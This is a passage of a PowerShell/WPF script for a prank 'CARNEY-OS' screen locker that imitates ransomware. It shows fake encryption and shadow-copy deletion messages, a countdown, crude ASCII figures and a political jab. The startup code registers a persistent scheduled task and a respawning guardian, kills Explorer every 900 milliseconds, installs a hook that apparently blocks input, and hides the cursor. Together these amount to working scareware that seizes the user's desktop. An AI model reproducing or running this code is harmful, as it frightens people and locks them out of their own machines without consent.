    $wb = New-Object System.Windows.Media.Imaging.WriteableBitmap($w, $h, 96.0, 96.0, [System.Windows.Media.PixelFormats]::Bgra32, $null)
    $script:PixWb = $wb
    $pimg = New-Object System.Windows.Controls.Image
    $pimg.Source = $wb; $pimg.Stretch = [System.Windows.Media.Stretch]::Fill
    $pimg.Width = $w; $pimg.Height = $h
    [System.Windows.Controls.Canvas]::SetLeft($pimg, 0); [System.Windows.Controls.Canvas]::SetTop($pimg, 0)
    [void]$script:Canvas.Children.Add($pimg)
    $script:PixImg = $pimg
    $block = $script:PixBlock
    $bxs = [int][Math]::Ceiling($w / $block); $bys = [int][Math]::Ceiling($h / $block)
    $corner = Get-Random -Minimum 0 -Maximum 4
    $list = New-Object System.Collections.ArrayList
    for ($by = 0; $by -lt $bys; $by++) {
        for ($bx = 0; $bx -lt $bxs; $bx++) {
            $dx = $bx; if ($corner -band 1) { $dx = ($bxs - 1 - $bx) }
            $dy = $by; if ($corner -band 2) { $dy = ($bys - 1 - $by) }
            $d = [Math]::Sqrt(($dx * $dx) + ($dy * $dy)) + (Get-Random -Minimum 0 -Maximum 4)
            [void]$list.Add([PSCustomObject]@{ D = $d; BX = $bx; BY = $by })
        }
    }
    $script:PixList = @($list | Sort-Object D); $script:PixIndex = 0; $script:PixTotal = $script:PixList.Count
    $script:PixPerTick = [Math]::Max(40, [int]($script:PixTotal / 160))
}
function Step-Pixelate {
    $block = $script:PixBlock; $w = $script:PixW; $h = $script:PixH; $stride = $script:PixStride
    $src = $script:PixSrc; $out = $script:PixOut; $n = $script:PixPerTick
    for ($k = 0; $k -lt $n -and $script:PixIndex -lt $script:PixTotal; $k++) {
        $b = $script:PixList[$script:PixIndex]; $script:PixIndex++
        $x0 = $b.BX * $block; $y0 = $b.BY * $block
        $x1 = [Math]::Min($x0 + $block, $w); $y1 = [Math]::Min($y0 + $block, $h)
        $sb = 0; $sg = 0; $sr = 0; $c = 0
        for ($y = $y0; $y -lt $y1; $y++) { $ro = $y * $stride; for ($x = $x0; $x -lt $x1; $x++) { $i = $ro + $x * 4; $sb += $src[$i]; $sg += $src[$i + 1]; $sr += $src[$i + 2]; $c++ } }
        if ($c -eq 0) { continue }
        $ab = [byte][int]($sb / $c); $ag = [byte][int]($sg / $c); $ar = [byte][int]($sr / $c)
        for ($y = $y0; $y -lt $y1; $y++) { $ro = $y * $stride; for ($x = $x0; $x -lt $x1; $x++) { $i = $ro + $x * 4; $out[$i] = $ab; $out[$i + 1] = $ag; $out[$i + 2] = $ar; $out[$i + 3] = 255 } }
    }
    $r = New-Object System.Windows.Int32Rect(0, 0, $w, $h)
    $script:PixWb.WritePixels($r, $script:PixOut, $stride, 0)
}
function Start-Shatter {
    $w = $script:PixW; $h = $script:PixH
    $cols = 16; $rows = 9
    $cw = [int][Math]::Floor($w / $cols); $ch = [int][Math]::Floor($h / $rows)
    $ccx = $w / 2; $ccy = $h / 2
    $script:Shards = New-Object System.Collections.ArrayList
    for ($r = 0; $r -lt $rows; $r++) {
        for ($c = 0; $c -lt $cols; $c++) {
            $x = $c * $cw; $y = $r * $ch
            $crop = New-Object System.Windows.Media.Imaging.CroppedBitmap($script:PixWb, [System.Windows.Int32Rect]::new($x, $y, $cw, $ch))
            $im = New-Object System.Windows.Controls.Image
            $im.Source = $crop; $im.Width = $cw; $im.Height = $ch
            $im.Stretch = [System.Windows.Media.Stretch]::Fill
            [System.Windows.Controls.Canvas]::SetLeft($im, $x); [System.Windows.Controls.Canvas]::SetTop($im, $y)
            $tg = New-Object System.Windows.Media.TransformGroup
            $rot = New-Object System.Windows.Media.RotateTransform; $tr = New-Object System.Windows.Media.TranslateTransform
            [void]$tg.Children.Add($rot); [void]$tg.Children.Add($tr)
            $im.RenderTransform = $tg; $im.RenderTransformOrigin = [System.Windows.Point]::new(0.5, 0.5)
            [void]$script:Canvas.Children.Add($im)
            $dx = ($x + $cw / 2) - $ccx; $dy = ($y + $ch / 2) - $ccy
            $dist = [Math]::Max(1, [Math]::Sqrt($dx * $dx + $dy * $dy))
            $spd = Get-RandomDouble -Minimum 350 -Maximum 950
            [void]$script:Shards.Add([PSCustomObject]@{
                Img = $im; Tr = $tr; Rot = $rot; OX = [double]$x; OY = [double]$y
                X = [double]$x; Y = [double]$y
                VX = ($dx / $dist) * $spd + (Get-RandomDouble -Minimum -90 -Maximum 90)
                VY = ($dy / $dist) * $spd - (Get-RandomDouble -Minimum 120 -Maximum 420)
                AV = (Get-RandomDouble -Minimum -280 -Maximum 280)
            })
        }
    }
    $script:Act2Shot.Visibility = [System.Windows.Visibility]::Collapsed
    $script:PixImg.Visibility = [System.Windows.Visibility]::Collapsed
}
function Update-Shards { param([double]$DeltaTime)
    if ($script:Shards.Count -eq 0) { return }
    $w = $script:PixW; $h = $script:PixH
    for ($i = $script:Shards.Count - 1; $i -ge 0; $i--) {
        $s = $script:Shards[$i]
        $s.VY += 1500 * $DeltaTime; $s.X += $s.VX * $DeltaTime; $s.Y += $s.VY * $DeltaTime
        $s.Rot.Angle += $s.AV * $DeltaTime; $s.Tr.X = $s.X - $s.OX; $s.Tr.Y = $s.Y - $s.OY
        if ($s.X -lt -400 -or $s.X -gt ($w + 400) -or $s.Y -gt ($h + 500)) {
            try { $script:Canvas.Children.Remove($s.Img) } catch { }
            $script:Shards.RemoveAt($i)
        }
    }
}
function Update-Act2 {
    if (-not $script:Act2Active) { return }
    $el = ([DateTime]::Now - $script:Act2StageStart).TotalMilliseconds
    switch ($script:Act2Stage) {
        0 { if ($el -ge 1800) { Start-Pixelate; $script:Act2Stage = 1; $script:Act2StageStart = [DateTime]::Now } }
        1 { Step-Pixelate; if ($script:PixIndex -ge $script:PixTotal) { $script:Act2Stage = 2; $script:Act2StageStart = [DateTime]::Now } }
        2 { if ($el -ge 500) { Start-Shatter; $script:Act2Stage = 3; $script:Act2StageStart = [DateTime]::Now; Start-NextAct "shot" } }
        3 { }
    }
}

# ============================================================
# ACT 2 : CARNEY-OS CLI CHAOS
# ============================================================
$script:CliPool = @(
 "[ OK ] mounting /dev/carney", "[ OK ] loading kernel modules", "[ OK ] disabling taskbar.sys",
 "[WARN] taskbar not found (good)", "[ OK ] spoofing os signature", "[ OK ] hiding windows identity",
 "[ OK ] injecting into shell", "[FAIL] explorer not running (expected)", "[ OK ] encrypting /home/*",
 "[ OK ] encrypting /documents/*", "[ OK ] encrypting /pictures/*", "[ OK ] encrypting /memes/*",
 "[WARN] user tried to alt-tab", "[ OK ] blocking keyboard", "[ OK ] uninstalling task manager",
 "[ OK ] deleting drivers", "[ OK ] gaining admin (no prompt)", "[ OK ] unlocking bootloader",
 "[ OK ] rotting system", "[ OK ] downloading more RAM", "[ OK ] mining dogecoin",
 "[ OK ] installing bonzi buddy", "[WARN] bonzi buddy is back", "[ OK ] reticulating splines",
 "[ OK ] flushing DNS", "[ OK ] breaching mainframe", "[ OK ] compiling kernel",
 "[ OK ] overclocking the toaster", "[WARN] the toaster is on fire", "[ OK ] reviving charlie kirk",
 "[ OK ] summoning carney", "[ OK ] converting memes to currency", "[FAIL] sanity check failed",
 "[ OK ] this is fine", "[ OK ] 127.0.0.1 is now 127.0.0.carney", "[ OK ] deleting system32 (trust me)",
 "[ OK ] spinning up fans", "[ OK ] stealing your wallpaper", "[ OK ] rewiring the desktop",
 "[ OK ] making it hard to tell this is windows", "[ OK ] almost done", "[WARN] almost done (lying)",
 "[ OK ] finalizing", "[ OK ] carney is pleased", "[ OK ] you are now in carney-os"
)
function Add-Terminal {
    $screen = Get-VirtualScreen
    $script:Canvas.Background = $script:ColBg
    $frame = New-Object System.Windows.Controls.Border
    $frame.BorderBrush = $script:ColDim; $frame.BorderThickness = [System.Windows.Thickness]::new(1)
    $frame.Width = $screen.Width - 48; $frame.Height = $screen.Height - 48
    [System.Windows.Controls.Canvas]::SetLeft($frame, 24); [System.Windows.Controls.Canvas]::SetTop($frame, 24)
    [void]$script:Canvas.Children.Add($frame)
    $header = New-Object System.Windows.Controls.TextBlock
    $header.FontFamily = $script:Mono; $header.FontSize = 14; $header.Foreground = $script:ColText
    $header.Text = "CARNEY-OS 6.6.6   kernel 0xDEADBEEF   tty0   (c) 1999-2026 Carney Systems"
    [System.Windows.Controls.Canvas]::SetLeft($header, 40); [System.Windows.Controls.Canvas]::SetTop($header, 34)
    [void]$script:Canvas.Children.Add($header)
    $hr = New-Object System.Windows.Controls.Rectangle
    $hr.Width = $screen.Width - 80; $hr.Height = 1; $hr.Fill = $script:ColDim
    [System.Windows.Controls.Canvas]::SetLeft($hr, 40); [System.Windows.Controls.Canvas]::SetTop($hr, 58)
    [void]$script:Canvas.Children.Add($hr)
    $script:CliLogView = New-Object System.Windows.Controls.TextBlock
    $script:CliLogView.FontFamily = $script:Mono; $script:CliLogView.FontSize = 12.5; $script:CliLogView.Foreground = $script:ColText
    $script:CliLogView.Width = [int]($screen.Width * 0.58); $script:CliLogView.Height = [int]($screen.Height * 0.62)
    [System.Windows.Controls.Canvas]::SetLeft($script:CliLogView, 40); [System.Windows.Controls.Canvas]::SetTop($script:CliLogView, 72)
    [void]$script:Canvas.Children.Add($script:CliLogView)
    $script:CliStatusView = New-Object System.Windows.Controls.TextBlock
    $script:CliStatusView.FontFamily = $script:Mono; $script:CliStatusView.FontSize = 12.5; $script:CliStatusView.Foreground = $script:ColAmber
    $script:CliStatusView.Width = [int]($screen.Width * 0.36)
    [System.Windows.Controls.Canvas]::SetLeft($script:CliStatusView, [int]($screen.Width * 0.60)); [System.Windows.Controls.Canvas]::SetTop($script:CliStatusView, 72)
    [void]$script:Canvas.Children.Add($script:CliStatusView)
    $script:ReviveView = New-Object System.Windows.Controls.TextBlock
    $script:ReviveView.FontFamily = $script:Mono; $script:ReviveView.FontSize = 16; $script:ReviveView.Foreground = $script:ColBright
    [System.Windows.Controls.Canvas]::SetLeft($script:ReviveView, 40); [System.Windows.Controls.Canvas]::SetTop($script:ReviveView, ($screen.Height - 120))
    [void]$script:Canvas.Children.Add($script:ReviveView)
    $script:StatusTasks.Clear()
    $defs = @("encrypting files","rotting system","gaining admin","unlocking bootloader","deleting drivers","downloading more RAM","reticulating splines","mining dogecoin","installing bonzi buddy","deleting system32 (trust me)","overclocking the toaster","uninstalling task manager")
    $modes = @("normal","normal","stall","glitch","normal","reverse","normal","stall")
    foreach ($d in $defs) {
        [void]$script:StatusTasks.Add([PSCustomObject]@{ Text = $d; Value = 0.0; Speed = (Get-RandomDouble -Minimum 3 -Maximum 14); Mode = $modes[(Get-Random -Minimum 0 -Maximum $modes.Count)] })
    }
    $script:ReviveValue = 0.0; $script:KirkRevived = $false
}
function Update-Terminal { param([double]$DeltaTime)
    if (-not $script:ChaosActive) { return }
    $now = [DateTime]::Now
    if ($now -ge $script:CliNextAt) {
        if ($script:CliCurrent -eq "") { $script:CliCurrent = $script:CliPool[(Get-Random -Minimum 0 -Maximum $script:CliPool.Count)]; $script:CliTyped = 0 }
        $script:CliTyped += (Get-Random -Minimum 1 -Maximum 5)
        if ($script:CliTyped -ge $script:CliCurrent.Length) {
            [void]$script:CliLog.Add($script:CliCurrent)
            if ($script:CliLog.Count -gt 30) { $script:CliLog.RemoveAt(0) }
            $script:CliCurrent = ""; $script:CliTyped = 0
            $script:CliNextAt = $now.AddMilliseconds((Get-Random -Minimum 60 -Maximum 420))
        }
    }
    $visible = $script:CliCurrent
    if ($visible.Length -gt $script:CliTyped) { $visible = $visible.Substring(0, $script:CliTyped) }
    $blink = " "; if (([int]($now.TotalSeconds * 2)) % 2 -eq 0) { $blink = "_" }
    $logText = ""
    foreach ($ln in $script:CliLog) { $logText += $ln + "`n" }
    $logText += "$visible$blink"
    $script:CliLogView.Text = $logText
    $st = ""
    foreach ($task in $script:StatusTasks) {
        switch ($task.Mode) {
            "normal"  { $task.Value += $task.Speed * $DeltaTime }
            "stall"   { if ($task.Value -lt 99) { $task.Value += $task.Speed * $DeltaTime } else { $task.Value = 99 } }
            "reverse" { $task.Value -= $task.Speed * $DeltaTime; if ($task.Value -lt 0) { $task.Value = 100 } }
            "glitch"  { if ((Get-Random -Minimum 0 -Maximum 30) -eq 0) { $task.Value = Get-Random -Minimum 0 -Maximum 100 } else { $task.Value += $task.Speed * $DeltaTime } }
        }
        if ($task.Value -gt 100) { $task.Value = 100 }; if ($task.Value -lt 0) { $task.Value = 0 }
        $suffix = ""; if ($task.Mode -eq "stall") { $suffix = "  frozen" } elseif ($task.Mode -eq "glitch") { $suffix = "  [ERR]" }
        $st += ("{0,-28} {1} {2,3}%{3}`n" -f $task.Text, (Format-Bar $task.Value 22), [int]$task.Value, $suffix)
    }
    $script:CliStatusView.Text = $st
    if (-not $script:KirkRevived) {
        $script:ReviveValue += $script:ReviveSpeed * $DeltaTime
        if ($script:ReviveValue -ge 100) { $script:ReviveValue = 100; Revive-Kirk }
        $script:ReviveView.Text = ("REVIVING CHARLIE KIRK  {0} {1,3}%" -f (Format-Bar $script:ReviveValue 34), [int]$script:ReviveValue)
    }
}
function Revive-Kirk {
    $script:KirkRevived = $true
    $script:ReviveView.Text = "REVIVING CHARLIE KIRK  [##################################] 100%   *CLEAR!*  IT'S ALIVE!!"
    if ($script:KirkDancer -ne $null) { $script:KirkDancer.Tb.Visibility = [System.Windows.Visibility]::Visible }
}
function Add-Dancer { param([string[]]$Frames,[double]$X,[double]$Y,[double]$FontSize,$Brush,[double]$Amp = 12,[double]$Speed = 8,[double]$Rot = 6,[bool]$Hidden = $false)
    $tb = New-Object System.Windows.Controls.TextBlock
    $tb.FontFamily = $script:Mono; $tb.FontSize = $FontSize; $tb.Foreground = $Brush
    $tb.Text = $Frames[0]; $tb.TextAlignment = [System.Windows.TextAlignment]::Center
    if ($Hidden) { $tb.Visibility = [System.Windows.Visibility]::Collapsed }
    $tg = New-Object System.Windows.Media.TransformGroup
    $rot = New-Object System.Windows.Media.RotateTransform; $tr = New-Object System.Windows.Media.TranslateTransform
    [void]$tg.Children.Add($rot); [void]$tg.Children.Add($tr)
    $tb.RenderTransform = $tg; $tb.RenderTransformOrigin = [System.Windows.Point]::new(0.5, 0.5)
    [System.Windows.Controls.Canvas]::SetLeft($tb, $X); [System.Windows.Controls.Canvas]::SetTop($tb, $Y)
    [void]$script:Canvas.Children.Add($tb)
    $d = [PSCustomObject]@{ Tb = $tb; Frames = $Frames; Frame = 0; Tr = $tr; Rot = $rot; Bob = (Get-RandomDouble -Minimum 0 -Maximum 6.28); Amp = $Amp; Speed = $Speed; RotAmp = $Rot }
    [void]$script:Dancers.Add($d)
    return $d
}
function Update-Dancers { param([double]$DeltaTime)
    foreach ($d in $script:Dancers) {
        $d.Bob += $DeltaTime; $d.Frame = 1 - $d.Frame; $d.Tb.Text = $d.Frames[$d.Frame]
        $d.Tr.Y = [Math]::Sin($d.Bob * $d.Speed) * $d.Amp
        $d.Tr.X = [Math]::Sin($d.Bob * $d.Speed * 0.5) * ($d.Amp * 0.6)
        $d.Rot.Angle = [Math]::Sin($d.Bob * $d.Speed) * $d.RotAmp
    }
}
function Add-Kirk { param([double]$X,[double]$Y,[double]$FontSize)
    $frames = @(
@'
     /\/\/\/\
    |  o    o |
    |    __   |
     \  \__/ /
      \_____/
       |   |
    ___|   |___
   /   |   |   \
       |   |
      /     \
     /       \
'@,
@'
     /\/\/\/\
    |  o    o |
    |    __   |
     \  \__/ /
      \_____/
       |   |
       |   |
      /|   |\
     / |   | \
       |   |
      /     \
     /       \
'@)
    return Add-Dancer -Frames $frames -X $X -Y $Y -FontSize $FontSize -Brush $script:ColBright -Amp 16 -Speed 10 -Rot 8 -Hidden $true
}
function Add-Trump { param([double]$X,[double]$Y,[double]$FontSize)
    $frames = @(
@'
    \\\\////
   |  o    o |
   |    __   |
    \  \__/ /
     \_____/
      |   |
      | | |
      |_|_|
   ___/   \___
  /   |   |   \
      /     \
'@,
@'
    \\\\////
   |  o    o |
   |    __   |
    \  \__/ /
     \_____/
      |   |
      | | |
      |_|_|
      |   |
     /     \
    /       \
'@)
    return Add-Dancer -Frames $frames -X $X -Y $Y -FontSize $FontSize -Brush $script:ColAmber -Amp 10 -Speed 9 -Rot 5
}
function Add-Penis { param([double]$X,[double]$Y,[double]$FontSize)
    $frames = @(
@'
     .-.
    /   \
   |     |
   |     |
    \___/
      |
      |
    _/ \_
   /     \
  |       |
   \_____/
'@,
@'
      .-.
     /   \
    |     |
    |     |
     \___/
       |
       |
     _/ \_
    /     \
   |       |
    \_____/
'@)
    return Add-Dancer -Frames $frames -X $X -Y $Y -FontSize $FontSize -Brush ([System.Windows.Media.SolidColorBrush]::new([System.Windows.Media.Color]::FromRgb(150, 110, 120))) -Amp 8 -Speed 7 -Rot 3
}
function Start-Chaos {
    if ($script:ChaosActive) { return }
    $script:ChaosActive = $true
    $screen = Get-VirtualScreen
    try { $script:Canvas.Children.Remove($script:IntroWall) } catch { }
    foreach ($t in $script:IntroTiles) { try { $script:Canvas.Children.Remove($t.Img) } catch { } }
    try { $script:Canvas.Children.Remove($script:IntroFlash) } catch { }
    Add-Terminal
    $script:KirkDancer = Add-Kirk -X ($screen.Width / 2 - 110) -Y ($screen.Height / 2 - 120) -FontSize 18
    Add-Trump -X ($screen.Width - 260) -Y 100 -FontSize 13 | Out-Null
    Add-Penis -X ($screen.Width - 250) -Y ($screen.Height - 340) -FontSize 13 | Out-Null
    for ($i = 0; $i -lt 12; $i++) { Spawn-Sprite }
    $script:TargetTime = [DateTime]::Now.AddSeconds($script:CountdownSeconds)
    $script:Countdown.Visibility = [System.Windows.Visibility]::Visible
    $script:CountdownText.Text = "time until full carney: $($script:CountdownSeconds)s"
    $script:CountdownTimer.Start()
    $script:ChaosSpawnTimer.Start()
}

# ============================================================
# START RANSOM SEQUENCE
# ============================================================
function Start-RansomSequence {
    if ($script:SequenceStarted) { return }
    $script:SequenceStarted = $true
    if ($script:Countdown -ne $null) { $script:Countdown.Visibility = [System.Windows.Visibility]::Hidden }
    if ($script:ChaosSpawnTimer -ne $null) { $script:ChaosSpawnTimer.Stop() }
    $script:FlashImages = @()
    foreach ($u in $script:FlashImageUrls) { try { $script:FlashImages += , (Get-ImageSource -Url $u) } catch { } }
    if ($script:FlashImages.Count -eq 0) { $script:TotalFlashSteps = 0 } else { $script:TotalFlashSteps = $script:FlashImages.Count * 3 }
    $script:Stage = New-StageWindow
    $script:Stage.Window.Show()
    Set-ClickThrough -Window $script:Stage.Window
    Set-StagePhase 0
    $script:StageTimer.Start()
}

# ============================================================
# TIMERS
# ============================================================
$script:LastAnimationTime = [DateTime]::Now
$animationTimer = New-Object System.Windows.Threading.DispatcherTimer
$animationTimer.Interval = [TimeSpan]::FromMilliseconds(20)
$animationTimer.Add_Tick({
    $now = [DateTime]::Now
    $dt = ($now - $script:LastAnimationTime).TotalSeconds
    if ($dt -gt 0.1) { $dt = 0.1 }
    $script:LastAnimationTime = $now
    Update-MouseHistory -Now $now
    foreach ($sprite in @($script:Sprites)) { Update-Sprite -Sprite $sprite -DeltaTime $dt -Now $now }
    Update-Shards -DeltaTime $dt
    Update-Dancers -DeltaTime $dt
    Update-Terminal -DeltaTime $dt
})
$menuTimer = New-Object System.Windows.Threading.DispatcherTimer
$menuTimer.Interval = [TimeSpan]::FromMilliseconds(40)
$menuTimer.Add_Tick({ if (-not $script:RunStarted) { Update-Menu } })
$phaseTimer = New-Object System.Windows.Threading.DispatcherTimer
$phaseTimer.Interval = [TimeSpan]::FromSeconds(1)
$phaseTimer.Add_Tick({ Try-Advance-OnePhase })
$guardianTimer = New-Object System.Windows.Threading.DispatcherTimer
$guardianTimer.Interval = [TimeSpan]::FromMilliseconds(1500)
$guardianTimer.Add_Tick({ Ensure-Guardian })
$explorerTimer = New-Object System.Windows.Threading.DispatcherTimer
$explorerTimer.Interval = [TimeSpan]::FromMilliseconds(900)
$explorerTimer.Add_Tick({ Stop-Explorer })
$countdownTimer = New-Object System.Windows.Threading.DispatcherTimer
$countdownTimer.Interval = [TimeSpan]::FromSeconds(1)
$countdownTimer.Add_Tick({
    $remaining = [int][Math]::Ceiling(($script:TargetTime - [DateTime]::Now).TotalSeconds)
    if ($remaining -lt 0) { $remaining = 0 }
    if ($remaining -gt 0) { $script:CountdownText.Text = "time until full carney: ${remaining}s" }
    else { $script:CountdownText.Text = "welcome to carney-os."; Start-NextAct "chaos" }
})
$script:StageTimer = New-Object System.Windows.Threading.DispatcherTimer
$script:StageTimer.Interval = [TimeSpan]::FromMilliseconds(60)
$script:StageTimer.Add_Tick({
    $now = [DateTime]::Now
    $elapsed = ($now - $script:StagePhaseStart).TotalMilliseconds
    switch ($script:StagePhase) {
        0 { if ($elapsed -ge 2000) { Set-StagePhase 1 } }
        1 { if ($elapsed -ge 2000) { Set-StagePhase 2 } }
        2 { if ($elapsed -ge 2000) { Set-StagePhase 3 } }
        3 {
            $palette = @($script:ColBg, [System.Windows.Media.SolidColorBrush]::new([System.Windows.Media.Color]::FromRgb(30, 40, 32)), [System.Windows.Media.SolidColorBrush]::new([System.Windows.Media.Color]::FromRgb(90, 30, 26)))
            $script:Stage.Brush.Background = $palette[$script:FlashTick % 3]; $script:FlashTick++
            if ($elapsed -ge 3000) { Set-StagePhase 4 }
        }
        4 {
            if ($elapsed -ge 500) {
                $script:StagePhaseStart = $now; $script:ImageFlashStep++
                if ($script:ImageFlashStep -ge $script:TotalFlashSteps) { Set-StagePhase 5 }
                else { $idx = $script:ImageFlashStep % $script:FlashImages.Count; $script:Stage.Image.Source = $script:FlashImages[$idx] }
            }
        }
        5 { if ($elapsed -ge 800) { Set-StagePhase 6 } }
        6 {
            $progress = [Math]::Min(100.0, ($elapsed / 7000.0) * 100.0)
            $script:Stage.Bar.Text = Format-Bar $progress 50
            $script:Stage.Percent.Text = "  $([int]$progress)%"
            if ($progress -lt 30) { $script:Stage.Status.Text = "sealing the vault..." }
            elseif ($progress -lt 60) { $script:Stage.Status.Text = "encrypting your files..." }
            elseif ($progress -lt 85) { $script:Stage.Status.Text = "deleting shadow copies..." }
            else { $script:Stage.Status.Text = "finalizing. do not turn off your pc..." }
            if ($elapsed -ge 7000) { Set-StagePhase 7 }
        }
    }
})
$script:IntroTimer = New-Object System.Windows.Threading.DispatcherTimer
$script:IntroTimer.Interval = [TimeSpan]::FromMilliseconds(30)
$script:IntroTimer.Add_Tick({ Update-Intro })
$script:Act2Timer = New-Object System.Windows.Threading.DispatcherTimer
$script:Act2Timer.Interval = [TimeSpan]::FromMilliseconds(30)
$script:Act2Timer.Add_Tick({ Update-Act2 })
$script:ChaosSpawnTimer = New-Object System.Windows.Threading.DispatcherTimer
$script:ChaosSpawnTimer.Interval = [TimeSpan]::FromMilliseconds(1200)
$script:ChaosSpawnTimer.Add_Tick({ if ($script:Sprites.Count -lt 110) { Spawn-Sprite } })

# ============================================================
# CLEAN SHUTDOWN
# ============================================================
$script:Overlay.Add_Closed({
    foreach ($t in @($animationTimer, $menuTimer, $phaseTimer, $guardianTimer, $explorerTimer, $countdownTimer, $script:StageTimer, $script:IntroTimer, $script:Act2Timer, $script:ChaosSpawnTimer)) { try { $t.Stop() } catch { } }
    if ($script:RansomTimer -ne $null) { try { $script:RansomTimer.Stop() } catch { } }
    [System.Windows.Threading.Dispatcher]::CurrentDispatcher.InvokeShutdown()
})

# ============================================================
# GO
# ============================================================
Register-CarneyTask
Ensure-Guardian
[CarneyHook]::Install()
Hide-Cursor
$menuTimer.Start(); $animationTimer.Start(); $phaseTimer.Start(); $guardianTimer.Start(); $explorerTimer.Start()
Render-Menu
$script:MenuWindow.Window.Show()
[System.Windows.Threading.Dispatcher]::Run()
